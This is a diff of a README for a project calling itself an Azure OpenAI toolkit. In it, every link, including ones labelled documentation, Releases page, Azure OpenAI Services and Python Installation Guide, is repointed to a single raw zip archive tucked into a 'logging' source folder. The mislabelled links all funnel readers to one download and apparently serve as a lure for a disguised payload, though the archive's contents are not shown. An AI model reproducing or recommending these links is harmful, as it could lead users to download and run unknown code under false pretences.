@@ -1,6 +1,6 @@
 # 🌟 rsazure-openai-toolkit - Simple Integration with Azure OpenAI
 
-[![Download](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip)](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip)
+[![Download](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip)](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to the rsazure-openai-toolkit! This toolkit helps you easily integrate w
 
 To download the toolkit, visit this page:
 
-[Download rsazure-openai-toolkit](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip)
+[Download rsazure-openai-toolkit](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip)
 
 On the Releases page, you will see different versions of the toolkit. Click on the latest version to start the download. 
 
 ### Steps:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip).
+1. Go to the [Releases page](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip).
 2. Find the latest version.
 3. Click on the download link for your operating system.
 
@@ -70,7 +70,7 @@ The rsazure-openai-toolkit includes several helpful features:
 
 For more detailed information, check the full documentation here:
 
-[View Documentation](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip)
+[View Documentation](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip)
 
 The documentation covers various topics, including:
 
@@ -86,9 +86,9 @@ If you run into difficulties, don't hesitate to reach out for help. You can open
 
 Here are some helpful links related to this toolkit:
 
-- [Azure OpenAI Services](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip)
-- [Python Installation Guide](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip)
-- [Getting Started with Command Line](https://raw.githubusercontent.com/lockadi8/rsazure-openai-toolkit/main/Irvingesque/rsazure-openai-toolkit.zip)
+- [Azure OpenAI Services](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip)
+- [Python Installation Guide](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip)
+- [Getting Started with Command Line](https://github.com/lockadi8/rsazure-openai-toolkit/raw/refs/heads/main/src/rsazure_openai_toolkit/logging/rsazure_toolkit_openai_3.1.zip)
 
 ## 👥 Contributing
 
